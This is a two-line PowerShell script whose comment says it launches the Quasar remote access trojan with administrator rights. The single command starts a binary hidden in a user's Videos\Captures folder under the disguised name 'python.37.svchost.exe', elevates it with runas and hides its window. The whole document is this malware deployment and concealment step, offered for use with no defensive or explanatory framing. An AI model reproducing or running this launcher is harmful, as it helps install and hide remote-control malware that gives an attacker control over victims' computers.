### PS1 file to run Quasar RAT as admin (since it seems to be rather impossible to "escalate" upon logon).

start-process powershell.exe -argumentlist "c:\users\cmtsadmin\videos\captures\python.37.svchost.exe" -verb runas -WindowStyle hidden
